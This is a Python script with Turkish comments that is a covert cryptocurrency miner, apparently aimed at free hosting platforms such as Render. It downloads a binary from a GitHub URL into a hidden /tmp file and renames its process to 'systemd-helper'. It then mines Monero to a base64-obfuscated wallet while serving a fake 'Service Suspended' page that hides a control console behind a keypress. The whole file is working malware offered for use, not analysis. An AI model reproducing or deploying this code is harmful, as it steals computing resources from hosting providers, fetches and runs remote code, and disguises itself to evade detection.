#!/usr/bin/env python3
import os
import time
import base64
import threading
import subprocess
import ctypes
import http.server
import urllib.request
import json
import re
import resource
from urllib.parse import urlparse
from collections import deque

libc = ctypes.CDLL('libc.so.6')
CONSOLE_LOGS = deque(maxlen=50)
STATUS = {"running": False, "message": "Sistem Beklemede"}
WALLET_ADDR = base64.b64decode("NDl5cWJOZ0cxMzVld3FKOXVOUVhUZ0I5bUthVVhmZzFiM2FiQWJoc1NEZ2g0YXNWYmZIdVlES0FkaWlkbVRDQjhwQUNZZHd4ejc3VHdKaHdFU2hEdDZuQkI1WmpjdEw=").decode()
CF_WORKER_HOST = ""

POOLS = [
    "gulf.moneroocean.stream:10128"
]

def clean_ansi(text):
    ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
    return ansi_escape.sub('', text)

def log_to_console(msg):
    clean_msg = clean_ansi(msg)
    timestamp = time.strftime("%H:%M:%S")
    line = f"[{timestamp}] {clean_msg}"
    CONSOLE_LOGS.append(line)
    print(msg)

def set_process_name(name):
    try: libc.prctl(15, name.encode('utf-8'), 0, 0, 0)
    except: pass

def kill_process(proc):
    try:
        proc.terminate()
        time.sleep(1)
        proc.kill()
    except:
        pass

def set_memory_limit():
    try:
        limit_bytes = 536870912 # 512 MB
        resource.setrlimit(resource.RLIMIT_AS, (limit_bytes, limit_bytes))
    except Exception:
        pass

def execution_logic():
    global STATUS
    
    # 1. Aşama: Dosyayı indir
    tmp_path = '/tmp/.kernel-sys'
    try:
        log_to_console("Sistem başlatılıyor. Çekirdek kontrol ediliyor...")
        url = "https://github.com/Exma0/va/raw/refs/heads/main/x"
        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req) as response:
            binary_content = response.read()
        
        with open(tmp_path, 'wb') as f:
            f.write(binary_content)
        
        os.chmod(tmp_path, 0o755)
        log_to_console("Çekirdek başarıyla hazırlandı.")
        set_process_name("systemd-helper")
        
    except Exception as e:
        STATUS["running"] = False
        STATUS["message"] = "İndirme Hatası"
        log_to_console(f"KRİTİK HATA (İndirme): {str(e)}")
        return

    # 2. Aşama: Sonsuz Döngü
    while True:
        try:
            pools_to_try = []
            if CF_WORKER_HOST:
                pools_to_try.append(f"{CF_WORKER_HOST}:443")
            pools_to_try.extend(POOLS)
            
            # --- SİTE ADI AYIKLAMA MANTIĞI ---
            # Örn: xx-83o2.onrender.com -> xx-83o2
            site_tag = "node"
            if CF_WORKER_HOST:
                site_tag = CF_WORKER_HOST.split('.')[0]
            # --------------------------------
            
            STATUS["running"] = True
            STATUS["message"] = "Sistem Aktif"
            
            for pool_host in pools_to_try:
                log_to_console(f"Bağlantı deneniyor: {pool_host}")
                
                # Dinamik Worker ID oluşturma
                worker_id = f"{site_tag}-{int(time.time())%1000}~ghostrider"
                
                use_tls = ":443" in pool_host
                cmd = [
                    tmp_path, "-o", pool_host, "-u", WALLET_ADDR,
                    "-p", worker_id, "--keepalive",
                    "--donate-level=1", "--cpu-max-threads-hint", "100"
                ]
                if use_tls:
                    cmd.append("--tls")
                
                proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                        text=True, env={"PATH": "/usr/bin:/bin", "HOME": "/tmp"},
                                        preexec_fn=set_memory_limit)
                
                error_count = 0
                max_errors = 5
                
                for line in iter(proc.stdout.readline, ""):
                    if not line: break
                    
                    log_to_console(f"{line.strip()}")
                    
                    low_line = line.lower()
                    if "read error" in low_line or "connection refused" in low_line:
                        error_count += 1
                        if error_count >= max_errors:
                            log_to_console("Hata limiti aşıldı, havuz değiştiriliyor...")
                            break
                    
                    if "accepted" in low_line:
                        error_count = 0 
                
                kill_process(proc)
                log_to_console(f"{pool_host} bağlantısı sonlandı.")
                time.sleep(3)
                
            log_to_console("Havuz listesi tamamlandı, yeniden başlanıyor...")
            time.sleep(5)
            
        except Exception as e:
            log_to_console(f"Çalışma zamanı hatası: {str(e)}")
            time.sleep(5)

class ControlHandler(http.server.BaseHTTPRequestHandler):
    def log_message(self, format, *args): return # HTTP loglarını kapat

    def do_GET(self):
        if self.path == "/api/logs":
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps(list(CONSOLE_LOGS)).encode())
            return

        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.end_headers()
        
        html = f"""
        <html><head><title>Service Suspended</title><style>
            body {{ background: #fff; color: #000; font-family: 'Times New Roman', serif; margin: 0; padding: 10px; }}
            #fake-page {{ display: block; }}
            #real-console {{ display: none; background: #000; color: #0f0; font-family: monospace; padding: 20px; min-height: 100vh; }}
            .panel {{ border: 1px solid #222; padding: 20px; max-width: 900px; margin: auto; background: #050505; }}
            #console {{ background: #000; border: 1px solid #111; height: 400px; overflow-y: auto; padding: 10px; font-size: 12px; color: #888; }}
            .stat {{ color: {"#0f0" if STATUS["running"] else "#f00"}; font-weight: bold; }}
        </style></head><body>
            <div id="fake-page">This service has been suspended by its owner.</div>
            <div id="real-console">
                <div class="panel">
                    <h2>KERNEL CONTROL UNIT</h2>
                    <p>DURUM: <span class="stat">{STATUS['message']}</span></p>
                    <div id="console">Konsol bekleniyor...</div>
                </div>
            </div>
            <script>
                document.addEventListener('keydown', function(e) {{
                    if (e.key === 'Insert') {{
                        var f = document.getElementById('fake-page');
                        var r = document.getElementById('real-console');
                        var isH = r.style.display === 'none' || r.style.display === '';
                        r.style.display = isH ? 'block' : 'none';
                        f.style.display = isH ? 'none' : 'block';
                        document.body.style.background = isH ? '#000' : '#fff';
                    }}
                }});
                async function u() {{
                    try {{
                        const r = await fetch('/api/logs');
                        const logs = await r.json();
                        const c = document.getElementById('console');
                        let scroll = c.scrollHeight - c.clientHeight <= c.scrollTop + 60;
                        c.innerHTML = logs.join('<br>');
                        if(scroll) c.scrollTop = c.scrollHeight;
                    }} catch(e) {{}}
                }}
                setInterval(u, 2000);
            </script>
        </body></html>
        """
        self.wfile.write(html.encode())

def run():
    global CF_WORKER_HOST
    # Render ortamında RENDER_EXTERNAL_HOSTNAME varsa onu kullan, yoksa PROXY_URL bak
    raw_url = os.environ.get("RENDER_EXTERNAL_HOSTNAME") or os.environ.get("PROXY_URL", "")
    parsed = urlparse(raw_url if "://" in raw_url else f"http://{raw_url}")
    CF_WORKER_HOST = parsed.netloc if parsed.netloc else raw_url
    
    port = int(os.environ.get("PORT", 8080))
    
    if not STATUS["running"]:
        threading.Thread(target=execution_logic, daemon=True).start()
        
    print(f"Sunucu {port} portunda aktif.")
    http.server.ThreadingHTTPServer(("0.0.0.0", port), ControlHandler).serve_forever()

if __name__ == "__main__":
    run()
